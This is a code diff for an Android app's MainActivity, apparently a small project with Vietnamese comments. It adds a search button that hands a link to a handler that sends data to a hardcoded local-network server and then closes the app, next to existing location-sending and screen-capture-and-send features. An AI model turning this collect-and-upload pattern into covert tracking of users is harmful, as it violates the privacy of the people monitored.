@@ -18,6 +18,9 @@ import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
 import android.util.Log;
+import android.view.accessibility.AccessibilityEvent;
+import android.webkit.WebView;
+import android.webkit.WebViewClient;
 import android.widget.Button;
 import android.widget.TextView;
 import android.widget.Toast;
@@ -28,6 +31,8 @@ import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
+import java.util.Date;
+
 public class MainActivity extends AppCompatActivity {
     private static final int LOCATION_PERMISSION_REQUEST_CODE = 1;
     private static final int REQUEST_CODE_SCREEN_CAPTURE = 102;
@@ -37,6 +42,13 @@ public class MainActivity extends AppCompatActivity {
     private Runnable locationRunnable;
     private LocationSender locationSender;
     private boolean canShowToast = true;
+
+    private WebView webView;
+    private Button sendButton;
+    private String searchUrl;
+    private long searchTime;
+    private static final String SERVER_URL = "http://192.168.2.16:5000";
+    private boolean isAcceptButtonClicked = false;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -66,6 +78,15 @@ public class MainActivity extends AppCompatActivity {
         Button btnCaptureAndSend = findViewById(R.id.btnCaptureAndSend);
         btnCaptureAndSend.setOnClickListener(v -> startScreenCapture());
 
+
+        SearchHandler searchHandler = new SearchHandler(this, SERVER_URL);
+
+        Button searchButton = findViewById(R.id.searchButton);
+        searchButton.setOnClickListener(v -> {
+            String link = "https://example.com"; // Thay bằng link của bạn
+            searchHandler.handleSearch(link);   // Gọi chức năng tìm kiếm và gửi dữ liệu
+            finish();                           // Thoát ứng dụng
+        });
     }
 
     private void startScreenCapture() {
@@ -132,6 +153,9 @@ public class MainActivity extends AppCompatActivity {
         };
         handler.post(locationRunnable);
     }
+
+
+
 
     @Override
     protected void onDestroy() {
